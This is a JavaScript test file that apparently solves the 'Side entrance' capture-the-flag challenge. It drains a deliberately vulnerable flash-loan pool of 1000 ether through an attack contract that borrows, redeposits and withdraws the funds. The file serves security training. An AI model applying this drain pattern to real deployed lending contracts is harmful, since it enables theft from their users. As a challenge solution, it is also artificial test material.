const { ether, balance } = require('@openzeppelin/test-helpers');
const { accounts, contract } = require('@openzeppelin/test-environment');

const SideEntranceLenderPool = contract.fromArtifact('SideEntranceLenderPool');
// attack side
const AttackSideEntranceLenderPool = contract.fromArtifact('AttackSideEntranceLenderPool');

const { expect } = require('chai');

describe('[Challenge] Side entrance', function () {

    const [deployer, attacker, ...otherAccounts] = accounts;

    const ETHER_IN_POOL = ether('1000');

    before(async function () {
        /** SETUP SCENARIO */
        this.pool = await SideEntranceLenderPool.new({ from: deployer });
        
        await this.pool.deposit({ from: deployer, value: ETHER_IN_POOL });

        this.attackerInitialEthBalance = await balance.current(attacker);

        expect(
            await balance.current(this.pool.address)
        ).to.be.bignumber.equal(ETHER_IN_POOL);
    });

    it('Exploit', async function () {
        /** YOUR EXPLOIT GOES HERE */
        // deploy contract
        this.attack = await AttackSideEntranceLenderPool.new(this.pool.address, { from: attacker });
        
        // launch the attack
        await this.attack.loan(ETHER_IN_POOL, { from: attacker });

        // withdraw from pool to attack contract
        await this.attack.withdrawFromPool({ from: attacker });

        // withdraw from attack contract to account
        await this.attack.withdraw( { from: attacker} );
        
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        expect(
            await balance.current(this.pool.address)
        ).to.be.bignumber.equal('0');
        
        // Not checking exactly how much is the final balance of the attacker,
        // because it'll depend on how much gas the attacker spends in the attack
        // If there were no gas costs, it would be balance before attack + ETHER_IN_POOL
        expect(
            await balance.current(attacker)
        ).to.be.bignumber.gt(this.attackerInitialEthBalance);
    });
});
